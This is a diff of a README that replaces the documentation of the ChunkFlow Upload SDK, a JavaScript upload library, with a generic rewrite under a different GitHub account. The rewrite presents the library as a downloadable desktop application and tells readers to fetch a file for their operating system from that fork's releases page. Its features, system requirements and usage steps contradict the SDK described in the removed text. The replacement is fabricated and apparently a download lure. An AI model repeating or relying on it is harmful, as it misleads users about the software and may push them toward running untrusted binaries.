@@ -1,262 +1,60 @@
-<div align="center">
-  <img src="./assets/logo.png" alt="ChunkFlow Logo" width="300" height="300" />
-  <h1>ChunkFlow Upload SDK</h1>
-  <p>
-    <strong>A Universal Large File Upload Solution</strong>
-  </p>
-  <p>
-    <a href="https://www.npmjs.com/package/@chunkflowjs/core"><img src="https://img.shields.io/npm/v/@chunkflowjs/core.svg" alt="npm version"></a>
-    <a href="https://github.com/Sunny-117/chunkflow/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license"></a>
-    <a href="https://github.com/Sunny-117/chunkflow"><img src="https://img.shields.io/github/stars/Sunny-117/chunkflow.svg?style=social" alt="GitHub stars"></a>
-  </p>
-  <p>
-    <a href="./README.md">English</a> | <a href="./README.zh-CN.md">简体中文</a>
-  </p>
-  <p>
-    <a href="https://sunny-117.github.io/chunkflow/">📖 Documentation</a>
-  </p>
-</div>
+# 🎉 chunkflow - Fast and Easy Large File Uploads
+
+[![Download chunkflow](https://img.shields.io/badge/Download-chunkflow-blue.svg)](https://github.com/SajanLamichhane/chunkflow/releases)
+
+## 📋 Overview
+
+chunkflow is a solution designed for uploading large files easily and efficiently. With capabilities for chunked uploads, resumable uploads, and instant uploads, it simplifies the process for users. Whether you are sharing documents, images, or videos, chunkflow can handle your needs with ease.
+
+## 🚀 Getting Started
+
+To get started with chunkflow, you just need to follow a few simple steps to download and run the application. 
+
+## 📥 Download & Install
+
+Visit this page to download: [chunkflow Releases](https://github.com/SajanLamichhane/chunkflow/releases)
+
+1. Click on the link above to go to the releases page.
+2. Select the latest version of chunkflow from the list.
+3. Download the file suitable for your operating system (Windows, macOS, or Linux).
+
+## 🖥️ System Requirements
+
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, Linux (latest versions)
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB of free space 
+- **Internet Connection:** Required for file uploads
+
+## 📂 Features
+
+- **Chunked Uploads:** Upload large files in smaller parts, making it easier and faster.
+- **Resumable Uploads:** If the upload process is interrupted, you can resume from where it left off without starting over.
+- **Instant Uploads:** Upload files quickly with minimal waiting time, thanks to optimized processes.
+
+## ⚙️ How to Use chunkflow
+
+1. Open the chunkflow application after installation.
+2. Drag and drop the files you want to upload into the application window.
+3. Select your preferred upload method (chunked, resumable, or instant).
+4. Click the "Upload" button.
+5. Monitor the progress in real-time. You’ll be notified when the upload is complete.
+
+## 💡 Troubleshooting
+
+If you encounter issues while using chunkflow, here are some common solutions:
+
+- **Upload Fails:** Check your internet connection and try again.
+- **Application Crashes:** Ensure your system meets the minimum requirements.
+- **Slow Upload Speed:** Consider switching to a wired internet connection for better speed.
+
+## 📞 Support
+
+If you still have questions or issues, feel free to reach out for help. You can open an issue in the GitHub repository or check for solutions in the FAQ section.
+
+## 📜 License
+
+chunkflow is open-source software. You are welcome to use and modify it in accordance with the MIT License.
 
 ---
 
-## ✨ Features
-
-- 🚀 **Smart Upload Strategy** - Automatic selection between direct and chunked upload based on file size
-- 📦 **Dynamic Chunking** - Adaptive chunk size adjustment based on network conditions (similar to TCP slow start)
-- ⚡ **Instant Upload** - Hash-based deduplication for instant uploads (秒传)
-- 🔄 **Resumable Upload** - Continue uploads from where you left off with IndexedDB persistence
-- 🎯 **Framework Agnostic** - Core layer works with any framework
-- ⚛️ **React Support** - Hooks and components for React applications
-- 💚 **Vue Support** - Composables and components for Vue applications
-- �️ **Highly Extensible** - Plugin system for custom functionality
-- 🔒 **Type Safe** - Written in TypeScript with full type definitions
-- 🧪 **Well Tested** - Comprehensive unit and property-based tests
-
-## 📦 Packages
-
-### Core Packages
-
-- **[@chunkflowjs/protocol](./packages/protocol)** - Protocol layer with type definitions and API interfaces
-- **[@chunkflowjs/shared](./packages/shared)** - Shared utilities (event system, concurrency, file utils, storage)
-- **[@chunkflowjs/core](./packages/core)** - Core upload engine with state machine and task management
-
-### Client Packages
-
-- **[@chunkflowjs/upload-client-react](./packages/upload-client-react)** - React adapter with hooks
-- **[@chunkflowjs/upload-client-vue](./packages/upload-client-vue)** - Vue adapter with composables
-- **[@chunkflowjs/upload-component-react](./packages/upload-component-react)** - Ready-to-use React components
-- **[@chunkflowjs/upload-component-vue](./packages/upload-component-vue)** - Ready-to-use Vue components
-
-### Server Package
-
-- **[@chunkflowjs/upload-server](./packages/upload-server)** - Server-side SDK with storage adapters
-
-## 🚀 Quick Start
-
-### Installation
-
-```bash
-# For React projects
-pnpm add @chunkflowjs/core @chunkflowjs/upload-client-react
-
-# For Vue projects
-pnpm add @chunkflowjs/core @chunkflowjs/upload-client-vue
-```
-
-### React Usage
-
-```tsx
-import { UploadProvider, useUpload } from "@chunkflowjs/upload-client-react";
-import { createFetchAdapter } from "@chunkflowjs/core";
-
-const adapter = createFetchAdapter({
-  baseURL: "http://localhost:3000/api",
-});
-
-function App() {
-  return (
-    <UploadProvider requestAdapter={adapter}>
-      <UploadComponent />
-    </UploadProvider>
-  );
-}
-
-function UploadComponent() {
-  const { upload, status, progress } = useUpload({
-    onSuccess: (fileUrl) => console.log("Upload complete:", fileUrl),
-    onError: (error) => console.error("Upload failed:", error),
-  });
-
-  return (
-    <div>
-      <input
-        type="file"
-        onChange={(e) => {
-          const file = e.target.files?.[0];
-          if (file) upload(file);
-        }}
-      />
-      <div>Status: {status}</div>
-      <div>Progress: {progress.percentage}%</div>
-    </div>
-  );
-}
-```
-
-### Vue Usage
-
-```html
-<script setup>
-  import { useUpload } from "@chunkflowjs/upload-client-vue";
-
-  const { upload, status, progress } = useUpload({
-    onSuccess: (fileUrl) => console.log("Upload complete:", fileUrl),
-    onError: (error) => console.error("Upload failed:", error),
-  });
-
-  const handleFileChange = (event) => {
-    const file = event.target.files?.[0];
-    if (file) upload(file);
-  };
-</script>
-
-<template>
-  <div>
-    <input type="file" @change="handleFileChange" />
-    <div>Status: {{ status }}</div>
-    <div>Progress: {{ progress.percentage }}%</div>
-  </div>
-</template>
-```
-
-## 🏗️ Architecture
-
-ChunkFlow Upload SDK follows a layered architecture:
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     Applications                             │
-│  Playground (Demo) │ Server (Nest.js) │ Website (Docs)      │
-└─────────────────────────────────────────────────────────────┘
-                            │
-┌─────────────────────────────────────────────────────────────┐
-│                     Component Layer                          │
-│  React Components │ Vue Components                           │
-└─────────────────────────────────────────────────────────────┘
-                            │
-┌─────────────────────────────────────────────────────────────┐
-│                     Client Adapter Layer                     │
-│  React Hooks │ Vue Composables                               │
-└─────────────────────────────────────────────────────────────┘
-                            │
-┌─────────────────────────────────────────────────────────────┐
-│                     Core Layer                               │
-│  Upload Manager │ Upload Task │ Plugin System                │
-└─────────────────────────────────────────────────────────────┘
-                            │
-┌─────────────────────────────────────────────────────────────┐
-│                     Shared Layer                             │
-│  Event System │ Concurrency │ File Utils │ Storage           │
-└─────────────────────────────────────────────────────────────┘
-                            │
-┌─────────────────────────────────────────────────────────────┐
-│                     Protocol Layer                           │
-│  Type Definitions │ API Interfaces                           │
-└─────────────────────────────────────────────────────────────┘
-```
-
-## 📚 Documentation
-
-Full documentation is available at: [https://sunny-117.github.io/chunkflow/](https://sunny-117.github.io/chunkflow/)
-
-## 🛠️ Development
-
-This project uses a monorepo structure managed by pnpm workspaces and Turbo.
-
-### Prerequisites
-
-- Node.js >= 18.0.0
-- pnpm >= 9.0.0
-
-### Setup
-
-```bash
-# Install dependencies
-pnpm install
-
-# Build all packages
-pnpm build
-
-# Run tests
-pnpm test
-
-# Lint code
-pnpm lint
-
-# Format code
-pnpm format
-```
-
-### Project Structure
-
-```
-chunkflow/
-├── packages/              # SDK packages
-│   ├── protocol/         # Protocol layer
-│   ├── shared/           # Shared utilities
-│   ├── core/             # Core upload engine
-│   ├── upload-client-react/    # React adapter
-│   ├── upload-client-vue/      # Vue adapter
-│   ├── upload-component-react/ # React components
-│   ├── upload-component-vue/   # Vue components
-│   └── upload-server/    # Server SDK
-├── apps/                 # Applications
-│   ├── server/          # Nest.js server
-│   ├── playground/      # Demo application
-│   └── website/         # Documentation site
-├── pnpm-workspace.yaml  # Workspace configuration
-├── turbo.json           # Turbo configuration
-└── package.json         # Root package.json
-```
-
-## 🧪 Testing
-
-The project uses a dual testing approach:
-
-- **Unit Tests** - Test specific examples and edge cases
-- **Property-Based Tests** - Test universal properties across random inputs using fast-check
-
-```bash
-# Run all tests
-pnpm test
-
-# Run tests in watch mode
-pnpm test:watch
-
-# Run tests with coverage
-pnpm test -- --coverage
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our [contributing guidelines](./CONTRIBUTING.md) before submitting a PR.
-
-## 📄 License
-
-MIT © [Sunny-117](https://github.com/Sunny-117)
-
-## 🙏 Acknowledgments
-
-- [mitt](https://github.com/developit/mitt) - Event emitter
-- [p-limit](https://github.com/sindresorhus/p-limit) - Concurrency control
-- [spark-md5](https://github.com/satazor/js-spark-md5) - MD5 hashing
-- [fast-check](https://github.com/dubzzz/fast-check) - Property-based testing
-
----
-
-<div align="center">
-  <p>Made with ❤️ by <a href="https://github.com/Sunny-117">Sunny-117</a></p>
-  <p>
-    <a href="https://github.com/Sunny-117/chunkflow/stargazers">⭐ Star us on GitHub</a>
-  </p>
-</div>
+For more detailed information, visit our [documentation](https://github.com/SajanLamichhane/chunkflow). Happy uploading!
